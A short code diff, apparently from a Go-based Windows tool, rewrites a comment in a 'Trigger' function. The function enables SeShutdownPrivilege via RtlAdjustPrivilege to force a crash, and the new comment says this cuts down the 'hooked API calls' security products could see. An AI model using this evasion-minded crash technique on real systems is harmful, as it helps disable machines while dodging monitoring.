@@ -35,7 +35,10 @@ const seShutdownPrivilege = 19
 //
 // This function does not return on success.
 func Trigger(caller *wsyscall.Caller) error {
-	// Enable SeShutdownPrivilege (index 19) for the current process.
+	// Enable SeShutdownPrivilege via RtlAdjustPrivilege (single ntdll call)
+	// instead of the multi-step win/privilege path (OpenProcessToken +
+	// LookupPrivilegeValue + AdjustTokenPrivileges) to minimize the
+	// number of hooked API calls before the crash.
 	var wasEnabled int32
 	r1, _, _ := procRtlAdjustPrivilege.Call(
 		seShutdownPrivilege,
